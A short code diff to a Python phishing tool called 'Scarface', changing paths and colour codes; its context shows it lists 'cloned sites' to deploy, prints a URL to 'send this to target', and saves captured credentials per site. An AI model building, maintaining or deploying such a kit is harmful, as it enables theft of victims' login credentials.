@@ -15,15 +15,14 @@ SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 SCARFACE_ROOT = os.path.abspath(os.path.join(SCRIPT_DIR, '..'))
 CREDENTIALS_DIR = os.path.join(SCARFACE_ROOT, "credentials")
 SITES_DIRS = [
-    os.path.join(SCRIPT_DIR, 'sites'),
-    os.path.join(SCARFACE_ROOT, 'sites'),
+    os.path.join(SCARFACE_ROOT, '.sites'),
 ]
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def read_banner():
-    banner_path = os.path.join(SCRIPT_DIR, ".banner.txt")
+    banner_path = os.path.join(SCRIPT_DIR, "../banner/scarface.txt")
     if not os.path.exists(banner_path):
         return "=== Scarface ==="
     with open(banner_path, "r", encoding="utf-8") as f:
@@ -32,8 +31,8 @@ def read_banner():
 def print_banner_and_url(url):
     clear_screen()
     banner = read_banner()
-    print(f"{GREEN}{banner}{RESET}\n")
-    print(f"{BOLD}{CYAN}Send this to target:{RESET} {LIGHT_GREEN}{url}{RESET}\n")
+    print(f"{BLUE}{banner}{RESET}\n")
+    print(f"{BOLD}{BLUE}Send this to target:{RESET} {LIGHT_GREEN}{url}{RESET}\n")
 
 def save_credentials(site, log_data):
     site_dir = os.path.join(CREDENTIALS_DIR, site)
@@ -69,9 +68,9 @@ def get_site_dir(site_name):
     return os.path.join(SITES_DIRS[0], site_name)
 
 def select_site(sites):
-    print(f"\n{BOLD}{CYAN}Available Cloned Sites:{RESET}")
+    print(f"\n{BOLD}{BLUE}Available Cloned Sites:{RESET}")
     for idx, site in enumerate(sites, 1):
-        print(f"  {CYAN}{idx}.{RESET} {site}")
+        print(f"  {BLUE}{idx}.{RESET} {site}")
     while True:
         try:
             choice = int(input(f"\n{BLUE}Enter site number to deploy:{RESET} "))
